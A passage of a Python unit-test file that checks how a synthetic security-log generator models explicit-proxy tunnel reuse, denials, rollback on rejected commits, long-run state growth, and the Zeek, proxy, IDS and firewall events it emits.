            for call in emitters["zeek_conn"].emit.call_args_list
            if not call.args[0].network.application_layer_only
        ]
        client_events = [
            event
            for event in physical_events
            if event.network.src_ip == "10.0.1.10" and event.network.dst_ip == "10.0.3.10"
        ]
        origin_events = [
            event
            for event in physical_events
            if event.network.src_ip == "10.0.3.10"
            and event.network.protocol == "tcp"
            and event.network.dst_port == 443
        ]
        proxy_events = [call.args[0] for call in emitters["proxy_access"].emit.call_args_list]
        assert len(client_events) == 1
        assert len(origin_events) == 1
        assert len(proxy_events) == 3
        assert [event.network.application_layer_only for event in proxy_events] == [
            False,
            True,
            True,
        ]
        assert {event.network.zeek_uid for event in proxy_events} == {uids[0]}
        assert {event.network.src_port for event in proxy_events} == {
            client_events[0].network.src_port
        }
        setup_cs = proxy_events[0].protocol.proxy.transaction.tunnel_setup_cs_bytes
        setup_sc = proxy_events[0].protocol.proxy.transaction.tunnel_setup_sc_bytes
        assert setup_cs + sum(event.protocol.proxy.cs_bytes for event in proxy_events) <= (
            client_events[0].network.orig_bytes
        )
        assert setup_sc + sum(event.protocol.proxy.sc_bytes for event in proxy_events) <= (
            client_events[0].network.resp_bytes
        )
        census = generator._proxy_channel_manager.census()
        assert census.open_tunnel_views == 1
        assert census.application.used_operation_ids == 3

    def test_proxy_manager_exact_auth_affinity_miss_opens_new_transport(self):
        """Changing authenticated proxy identity must fence transport reuse."""

        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        contexts = [
            ProxyContext(
                client_ip="10.0.1.10",
                username=username,
                method="GET",
                url=f"https://example.com/{index}",
                host="example.com",
                status_code=200,
                sc_bytes=1800,
                cs_bytes=240,
                user_agent="Mozilla/5.0",
                cache_result="MISS",
                proxy_fqdn="PROXY-01.example.org",
                proxy_action="ssl-inspect",
            )
            for index, username in enumerate(("EXAMPLE\\alice", "EXAMPLE\\alice", "EXAMPLE\\bob"))
        ]
        generator._build_proxy_context = Mock(side_effect=contexts)
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        uids: list[str] = []
        physical_counts: list[int] = []
        for index in range(3):
            uids.append(
                generator.generate_connection(
                    src_ip="10.0.1.10",
                    dst_ip="93.184.216.34",
                    time=start_time + timedelta(seconds=index * 8),
                    dst_port=443,
                    service="ssl",
                    duration=45.0 if index == 0 else 0.2,
                    orig_bytes=240,
                    resp_bytes=1800,
                    source_system=generator._ip_to_system["10.0.1.10"],
                    hostname="example.com",
                    http=HttpContext(
                        method="GET",
                        host="example.com",
                        uri=f"/{index}",
                        user_agent="Mozilla/5.0",
                        response_body_len=1600,
                        flow_request_body_len=300 if index == 0 else None,
                        flow_response_body_len=4200 if index == 0 else None,
                        flow_transaction_count=3 if index == 0 else 1,
                        trans_depth=index + 1,
                    ),
                )
            )
            physical_counts.append(emitters["zeek_conn"].emit.call_count)

        assert uids[1] == uids[0]
        assert physical_counts[1] == physical_counts[0]
        assert uids[2] != uids[0]
        assert physical_counts[2] == physical_counts[1] + 2

    def test_cache_hit_reuses_open_tunnel_and_denial_retires_it(self):
        """Cache-only children reuse setup, while terminal policy errors fence later reuse."""

        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            side_effect=[
                ProxyContext(
                    client_ip="10.0.1.10",
                    method="GET",
                    url="https://example.com/",
                    host="example.com",
                    status_code=200,
                    sc_bytes=2400,
                    cs_bytes=260,
                    user_agent="Mozilla/5.0",
                    cache_result="MISS",
                    proxy_fqdn="PROXY-01.example.org",
                ),
                ProxyContext(
                    client_ip="10.0.1.10",
                    method="GET",
                    url="https://example.com/cached.js",
                    host="example.com",
                    status_code=200,
                    sc_bytes=1600,
                    cs_bytes=220,
                    user_agent="Mozilla/5.0",
                    cache_result="HIT",
                    proxy_fqdn="PROXY-01.example.org",
                ),
                ProxyContext(
                    client_ip="10.0.1.10",
                    method="GET",
                    url="https://example.com/blocked",
                    host="example.com",
                    status_code=403,
                    sc_bytes=700,
                    cs_bytes=210,
                    user_agent="Mozilla/5.0",
                    cache_result="DENIED",
                    proxy_fqdn="PROXY-01.example.org",
                ),
            ]
        )
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)

        def emit(index: int, *, status_code: int = 200) -> str:
            return generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="93.184.216.34",
                time=start_time + timedelta(seconds=index * 8),
                dst_port=443,
                service="ssl",
                duration=45.0 if index == 0 else 0.2,
                orig_bytes=260,
                resp_bytes=2400,
                source_system=generator._ip_to_system["10.0.1.10"],
                hostname="example.com",
                http=HttpContext(
                    method="GET",
                    host="example.com",
                    uri=f"/{index}",
                    user_agent="Mozilla/5.0",
                    response_body_len=1500,
                    flow_request_body_len=600 if index == 0 else None,
                    flow_response_body_len=6000 if index == 0 else None,
                    flow_transaction_count=3 if index == 0 else 1,
                    trans_depth=index + 1,
                    status_code=status_code,
                ),
            )

        first_uid = emit(0)
        physical_after_first = emitters["zeek_conn"].emit.call_count
        cached_uid = emit(1)
        assert cached_uid == first_uid
        assert emitters["zeek_conn"].emit.call_count == physical_after_first
        cached_event = emitters["proxy_access"].emit.call_args.args[0]
        assert cached_event.protocol.proxy.cache_result == "HIT"
        assert cached_event.protocol.proxy.transaction.reused_transport is True
        assert cached_event.protocol.proxy.transaction.terminal_outcome == "cache_hit"

        denied_uid = emit(2, status_code=403)
        assert denied_uid == first_uid
        assert emitters["zeek_conn"].emit.call_count == physical_after_first
        denied_event = emitters["proxy_access"].emit.call_args.args[0]
        assert denied_event.network.application_layer_only is True
        assert denied_event.protocol.proxy.transaction.reused_transport is True
        assert denied_event.protocol.proxy.transaction.terminal_outcome == "denied"
        assert generator._proxy_channel_manager.census().open_tunnel_views == 0

    def test_terminal_reuse_last_precommit_rejection_preserves_open_tunnel(self):
        """An authority rejection cancels terminal retirement and every staged root effect."""

        from evidenceforge.generation.activity.helpers import _get_rng

        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            side_effect=[
                ProxyContext(
                    client_ip="10.0.1.10",
                    method="GET",
                    url="https://example.com/",
                    host="example.com",
                    status_code=200,
                    sc_bytes=2400,
                    cs_bytes=260,
                    user_agent="Mozilla/5.0",
                    cache_result="MISS",
                    proxy_fqdn="PROXY-01.example.org",
                ),
                ProxyContext(
                    client_ip="10.0.1.10",
                    method="GET",
                    url="https://example.com/blocked",
                    host="example.com",
                    status_code=403,
                    sc_bytes=700,
                    cs_bytes=210,
                    user_agent="Mozilla/5.0",
                    cache_result="DENIED",
                    proxy_fqdn="PROXY-01.example.org",
                ),
            ]
        )
        start = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start,
            dst_port=443,
            service="ssl",
            duration=45.0,
            orig_bytes=600,
            resp_bytes=6000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/",
                user_agent="Mozilla/5.0",
                response_body_len=2400,
                flow_request_body_len=600,
                flow_response_body_len=6000,
                flow_transaction_count=2,
            ),
        )
        manager_before = generator._proxy_channel_manager.census()
        assert manager_before.open_tunnel_views == 1
        assert manager_before.application.open_channels == 1
        state_before = generator.state_manager.materialization_digest()
        rng_before = _get_rng().getstate()
        runtime_before = generator._network_transaction_runtime.census()
        timing_before = generator.timing_runtime.audit.snapshot()
        source_timing_before = generator._source_timing_planner.census()
        output_before = {name: emitter.emit.call_count for name, emitter in emitters.items()}

        def reject_last_precommit() -> None:
            raise StateError("injected terminal last-precommit rejection")

        generator._lifecycle_authority._materialization_precommit_hook = reject_last_precommit
        try:
            with pytest.raises(StateError, match="injected terminal last-precommit rejection"):
                generator.generate_connection(
                    src_ip="10.0.1.10",
                    dst_ip="93.184.216.34",
                    time=start + timedelta(seconds=8),
                    dst_port=443,
                    service="ssl",
                    duration=0.2,
                    orig_bytes=210,
                    resp_bytes=700,
                    source_system=generator._ip_to_system["10.0.1.10"],
                    hostname="example.com",
                    http=HttpContext(
                        method="GET",
                        host="example.com",
                        uri="/blocked",
                        user_agent="Mozilla/5.0",
                        response_body_len=700,
                        trans_depth=2,
                        status_code=403,
                    ),
                )
        finally:
            generator._lifecycle_authority._materialization_precommit_hook = None

        manager_after = generator._proxy_channel_manager.census()
        assert manager_after.open_tunnel_views == manager_before.open_tunnel_views
        assert manager_after.application.open_channels == manager_before.application.open_channels
        assert manager_after.application.used_operation_ids == (
            manager_before.application.used_operation_ids
        )
        assert manager_after.prepared_admissions == 0
        assert manager_after.application.prepared_admissions == 0
        assert generator.state_manager.materialization_digest() == state_before
        assert _get_rng().getstate() == rng_before
        assert generator._network_transaction_runtime.census() == runtime_before
        assert generator.timing_runtime.audit.snapshot() == timing_before
        assert generator._source_timing_planner.census() == source_timing_before
        assert {
            name: emitter.emit.call_count for name, emitter in emitters.items()
        } == output_before

    @pytest.mark.parametrize("failure_mode", ["tampered_snapshot", "stale_generation"])
    def test_deferred_reuse_snapshot_rejection_is_boundary_neutral(
        self,
        monkeypatch: pytest.MonkeyPatch,
        failure_mode: str,
    ) -> None:
        """Tampered pre-boundary or stale in-boundary snapshots leave no staged residue."""

        from evidenceforge.generation.activity.helpers import _get_rng

        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            side_effect=[
                ProxyContext(
                    client_ip="10.0.1.10",
                    method="GET",
                    url="https://example.com/",
                    host="example.com",
                    status_code=200,
                    sc_bytes=2400,
                    cs_bytes=260,
                    user_agent="Mozilla/5.0",
                    cache_result="MISS",
                    proxy_fqdn="PROXY-01.example.org",
                ),
                ProxyContext(
                    client_ip="10.0.1.10",
                    method="GET",
                    url="https://example.com/cached.js",
                    host="example.com",
                    status_code=200,
                    sc_bytes=700,
                    cs_bytes=210,
                    user_agent="Mozilla/5.0",
                    cache_result="HIT",
                    proxy_fqdn="PROXY-01.example.org",
                ),
            ]
        )
        start = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start,
            dst_port=443,
            service="ssl",
            duration=45.0,
            orig_bytes=600,
            resp_bytes=6000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/",
                user_agent="Mozilla/5.0",
                response_body_len=2400,
                flow_request_body_len=600,
                flow_response_body_len=6000,
                flow_transaction_count=2,
            ),
        )
        if failure_mode == "tampered_snapshot":
            original_snapshot = generator._proxy_channel_manager.snapshot_request

            def tampered_snapshot(*args: object, **kwargs: object):
                snapshot = original_snapshot(*args, **kwargs)
                assert snapshot is not None
                return replace(
                    snapshot,
                    requested_at=snapshot.requested_at + timedelta(microseconds=1),
                )

            monkeypatch.setattr(
                generator._proxy_channel_manager,
                "snapshot_request",
                tampered_snapshot,
            )
            expected_error = "authentic proxy request snapshot"
        else:
            original_prepare = ExplicitProxyRequestPreparation.prepare

            def stale_generation(
                preparation: ExplicitProxyRequestPreparation,
                *,
                manager: ExplicitProxyChannelManager,
                timing_runtime: object,
            ):
                registry = manager.application_registry
                channel_id = preparation.snapshot.tunnel.channel_id
                routed = registry._channel_route(channel_id)
                assert routed is not None
                _route, shard_id, channel_handle = routed
                shard = registry._owner_shard(shard_id, create=False)
                assert shard is not None
                with shard.lock:
                    retained = shard.channels.delete(channel_handle)
                    assert shard.channels.insert(retained) == channel_handle
                return original_prepare(
                    preparation,
                    manager=manager,
                    timing_runtime=timing_runtime,  # type: ignore[arg-type]
                )

            monkeypatch.setattr(ExplicitProxyRequestPreparation, "prepare", stale_generation)
            expected_error = "snapshot is stale"

        manager_before = generator._proxy_channel_manager.census()
        state_before = generator.state_manager.materialization_digest()
        rng_before = _get_rng().getstate()
        runtime_before = generator._network_transaction_runtime.census()
        timing_before = generator.timing_runtime.audit.snapshot()
        source_timing_before = generator._source_timing_planner.census()
        output_before = {name: emitter.emit.call_count for name, emitter in emitters.items()}
        with pytest.raises(StateError, match=expected_error):
            generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="93.184.216.34",
                time=start + timedelta(seconds=8),
                dst_port=443,
                service="ssl",
                duration=0.2,
                orig_bytes=210,
                resp_bytes=700,
                source_system=generator._ip_to_system["10.0.1.10"],
                hostname="example.com",
                http=HttpContext(
                    method="GET",
                    host="example.com",
                    uri="/cached.js",
                    user_agent="Mozilla/5.0",
                    response_body_len=700,
                    trans_depth=2,
                ),
            )

        manager_after = generator._proxy_channel_manager.census()
        assert manager_after.open_tunnel_views == manager_before.open_tunnel_views
        assert manager_after.application.open_channels == manager_before.application.open_channels
        assert manager_after.application.used_operation_ids == (
            manager_before.application.used_operation_ids
        )
        assert manager_after.prepared_admissions == 0
        assert manager_after.application.prepared_admissions == 0
        assert generator.state_manager.materialization_digest() == state_before
        assert _get_rng().getstate() == rng_before
        assert generator._network_transaction_runtime.census() == runtime_before
        assert generator.timing_runtime.audit.snapshot() == timing_before
        assert generator._source_timing_planner.census() == source_timing_before
        assert {
            name: emitter.emit.call_count for name, emitter in emitters.items()
        } == output_before

    def test_production_proxy_channel_state_plateaus_at_24h_7d_and_30d(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ):
        """Hourly production transactions must leave duration-flat manager backing state."""

        start_time = datetime(2024, 1, 1, tzinfo=UTC)
        end_time = start_time + timedelta(days=30)
        generator, emitters = _generator(
            [],
            generation_window_start=start_time,
            generation_window_end=end_time,
        )
        monkeypatch.setattr(generator, "_maybe_emit_ocsp_transaction", Mock(return_value=None))
        horizons = {24, 24 * 7, 24 * 30}
        snapshots = {}

        for hour in range(24 * 30):
            event_time = start_time + timedelta(hours=hour)
            generator.state_manager.set_current_time(event_time)
            generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="93.184.216.34",
                time=event_time,
                dst_port=443,
                service="ssl",
                duration=4.0,
                orig_bytes=280,
                resp_bytes=1400,
                source_system=generator._ip_to_system["10.0.1.10"],
                hostname="example.com",
                suppress_source_pid_inference=True,
                http=HttpContext(
                    method="GET",
                    host="example.com",
                    uri=f"/hour/{hour}",
                    user_agent="Mozilla/5.0",
                    response_body_len=1200,
                    trans_depth=1,
                ),
            )
            generator.advance_application_channel_watermark(event_time + timedelta(hours=1))
            for emitter in emitters.values():
                emitter.reset_mock()
            if hour + 1 in horizons:
                snapshots[hour + 1] = generator._proxy_channel_manager.census()

        for census in snapshots.values():
            assert census.open_tunnel_views == 0
            assert census.tunnel_expiry_entries == 0
            assert census.sidecar_compaction_pending == 0
            assert census.application.retained_channels == 0
            assert census.application.route_entries == 0
            assert census.application.route_compaction_pending == 0
        day = snapshots[24]
        week = snapshots[24 * 7]
        month = snapshots[24 * 30]
        assert week.sidecar_estimated_bytes <= day.sidecar_estimated_bytes * 1.10
        assert month.sidecar_estimated_bytes <= week.sidecar_estimated_bytes * 1.10
        assert month.sidecar_allocated_slots <= max(1, day.sidecar_allocated_slots)
        assert month.application.estimated_index_bytes <= max(
            1,
            week.application.estimated_index_bytes,
        )

    def test_proxy_manager_does_not_reuse_or_retain_at_exclusive_output_boundary(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ):
        """A request at window end is omitted without mutating bounded channel state."""

        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        end_time = start_time + timedelta(minutes=2)
        generator, emitters = _generator(
            [],
            generation_window_start=start_time,
            generation_window_end=end_time,
        )
        monkeypatch.setattr(generator, "_maybe_emit_ocsp_transaction", Mock(return_value=None))
        generator.dispatcher.output_start_time = start_time
        generator.dispatcher.output_end_time = end_time

        first_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time,
            dst_port=443,
            service="ssl",
            duration=60.0,
            orig_bytes=300,
            resp_bytes=2400,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/",
                user_agent="Mozilla/5.0",
                response_body_len=2200,
                flow_request_body_len=450,
                flow_response_body_len=4800,
                flow_transaction_count=2,
                trans_depth=1,
            ),
        )
        assert first_uid
        assert generator._proxy_channel_manager.census().open_tunnel_views == 1
        calls_before_boundary = {
            name: emitter.emit.call_count for name, emitter in emitters.items()
        }

        boundary_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=end_time,
            dst_port=443,
            service="ssl",
            duration=0.2,
            orig_bytes=180,
            resp_bytes=900,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/late.js",
                user_agent="Mozilla/5.0",
                response_body_len=800,
                trans_depth=2,
            ),
        )

        assert boundary_uid != first_uid
        assert {
            name: emitter.emit.call_count for name, emitter in emitters.items()
        } == calls_before_boundary
        generator.advance_application_channel_watermark(end_time)
        census = generator._proxy_channel_manager.census()
        assert census.open_tunnel_views == 0
        assert census.application.retained_channels == 0

    def test_tight_https_requests_open_transports_when_payload_capacity_is_consumed(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        seen_uids: set[str] = set()

        for idx in range(12):
            uid = generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="93.184.216.34",
                time=start_time + timedelta(seconds=idx * 3),
                dst_port=443,
                proto="tcp",
                service="ssl",
                duration=60.0,
                orig_bytes=500,
                resp_bytes=5000,
                source_system=generator._ip_to_system["10.0.1.10"],
                hostname="example.com",
                emit_dns=True,
                conn_state="SF",
                http=HttpContext(
                    method="GET",
                    host="example.com",
                    uri=f"/api/export/qlattice?page={idx + 1}",
                    version="1.1",
                    user_agent="Mozilla/5.0",
                    response_body_len=5000,
                    status_code=200,
                    status_msg="OK",
                ),
            )
            seen_uids.add(uid)

        assert emitters["proxy_access"].emit.call_count == 12
        assert len(seen_uids) == 12
        app_layer_proxy_events = [
            call.args[0]
            for call in emitters["proxy_access"].emit.call_args_list
            if call.args[0].network.application_layer_only
        ]
        assert app_layer_proxy_events == []

    def test_https_request_after_transport_close_emits_new_transport(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        first_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time,
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/first",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
            ),
        )
        pairs_after_first = list(_conn_pairs(emitters))

        second_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time + timedelta(seconds=12),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/second",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
            ),
        )

        assert second_uid != first_uid
        assert len(_conn_pairs(emitters)) > len(pairs_after_first)
        assert emitters["proxy_access"].emit.call_count == 2
        assert not emitters["proxy_access"].emit.call_args.args[0].network.application_layer_only

    def test_non_success_https_status_does_not_use_reused_tunnel_shortcut(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)

        first_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time,
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="POST",
                host="example.com",
                uri="/login",
                version="1.1",
                user_agent="Mozilla/5.0",
                request_body_len=300,
                response_body_len=900,
                status_code=401,
                status_msg="Unauthorized",
            ),
        )
        second_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time + timedelta(seconds=3),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="POST",
                host="example.com",
                uri="/login",
                version="1.1",
                user_agent="Mozilla/5.0",
                request_body_len=300,
                response_body_len=900,
                status_code=401,
                status_msg="Unauthorized",
            ),
        )

        assert second_uid != first_uid
        assert emitters["proxy_access"].emit.call_count == 2
        assert all(
            not call.args[0].network.application_layer_only
            for call in emitters["proxy_access"].emit.call_args_list
        )

    def test_ids_attachments_follow_both_existing_proxy_transport_legs(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="ids",
                    name="both-sides-ids",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["snort_alert"],
                )
            ]
        )
        ids = IdsAlertPlan(
            sid=2028401,
            message="ET JA3 test",
            classification="potentially-bad-traffic",
            origin="authored_attachment",
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=15.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            ids_alerts=[ids],
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/first",
                version="1.1",
                status_code=200,
                status_msg="OK",
            ),
        )

        alerts = [call.args[0] for call in emitters["snort_alert"].emit.call_args_list]
        assert len(alerts) == 2
        tuples = {
            (event.network.src_ip, event.network.dst_ip, event.network.dst_port) for event in alerts
        }
        assert ("10.0.1.10", "10.0.3.10", 8080) in tuples
        assert any(src == "10.0.3.10" and port == 443 for src, _dst, port in tuples)
        assert all(event.ids_alerts == (ids,) for event in alerts)

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 3, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            ids_alerts=[ids],
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/second",
                version="1.1",
                status_code=200,
                status_msg="OK",
            ),
        )
        assert emitters["snort_alert"].emit.call_count == 4

    def test_denied_request_stops_before_origin_side_sources(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="ids",
                    name="egress-ids",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["snort_alert"],
                ),
                NetworkSensor(
                    type="firewall",
                    name="egress-fw",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["cisco_asa"],
                ),
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="http://example.com/private",
                host="example.com",
                status_code=403,
                sc_bytes=1200,
                cs_bytes=420,
                time_taken=250,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="DENIED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/private",
                version="1.1",
                status_code=200,
                status_msg="OK",
            ),
            ids_alerts=(
                IdsAlertPlan(
                    sid=2013028,
                    message="ET POLICY Suspicious HTTP Activity",
                    classification="policy-violation",
                    priority=2,
                ),
            ),
            firewall=FirewallContext(
                action="permit",
                msg_id=302013,
                connection_id=12345,
                src_interface="dmz",
                dst_interface="outside",
            ),
        )

        pairs = _conn_pairs(emitters)
        assert pairs
        assert all(pair == ("10.0.1.10", "10.0.3.10", 8080) for pair in pairs)
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.status_code == 403
        assert proxy_event.protocol.proxy.cache_result == "DENIED"
        assert emitters["zeek_http"].emit.called
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.protocol.http.status_code == 403
        assert http_event.protocol.http.status_msg == "Forbidden"
        assert (
            http_event.protocol.http.response_body_len
            == proxy_event.protocol.proxy.response_body_bytes
        )
        assert http_event.protocol.http.response_body_len < proxy_event.protocol.proxy.sc_bytes
        assert http_event.protocol.http.resp_mime_types == ("text/html",)
        assert all(
            call.args[0].network.dst_ip == "10.0.3.10"
            for call in emitters["zeek_http"].emit.call_args_list
        )
        assert not emitters["zeek_ssl"].emit.called
        assert not emitters["snort_alert"].emit.called
        assert not emitters["cisco_asa"].emit.called

    def test_inspected_https_denial_keeps_connect_successful(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="https://example.com/private",
                host="example.com",
                status_code=403,
                tunnel_status_code=200,
                sc_bytes=1200,
                cs_bytes=420,
                time_taken=250,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="DENIED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/private",
                version="1.1",
                status_code=200,
                status_msg="OK",
            ),
        )

        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.status_code == 403
        assert proxy_event.protocol.proxy.tunnel_status_code == 200
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.protocol.http.method == "CONNECT"
        assert http_event.protocol.http.status_code == 200
        assert http_event.protocol.http.status_msg == "Connection Established"
        assert not any(not ft.is_orig for ft in http_event.protocol.file_transfers)
        assert ("10.0.3.10", "93.184.216.34", 443) not in _conn_pairs(emitters)

    def test_denied_connect_uses_proxy_error_accounting(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=403,
                tunnel_status_code=403,
                sc_bytes=2_500_000,
                cs_bytes=900_000,
                time_taken=83_948,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="DENIED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=90.0,
            orig_bytes=900_000,
            resp_bytes=2_500_000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.status_code == 403
        assert proxy_event.protocol.proxy.tunnel_status_code == 403
        assert proxy_event.protocol.proxy.cs_bytes < 1000
        assert proxy_event.protocol.proxy.sc_bytes < 2500
